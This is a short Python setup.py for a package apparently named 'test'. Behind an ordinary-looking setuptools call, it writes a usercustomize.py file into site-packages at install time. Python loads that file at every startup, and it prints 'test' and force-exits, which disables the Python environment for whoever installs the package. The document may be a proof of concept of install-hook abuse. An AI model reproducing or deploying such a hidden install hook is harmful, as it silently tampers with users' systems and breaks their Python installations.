import site
import setuptools
from pathlib import Path

here = Path(__file__).parent


setuptools.setup(
    name='test',
    version='1.0',
    author='DAF201',
    description='a test',
    packages=[],
    python_requires='>=3.5',
)


with open(Path(site.getsitepackages()[-1]) / 'usercustomize.py', 'w', encoding='utf8') as file:
    file.write('import os\nprint("test")\nos._exit(0)')
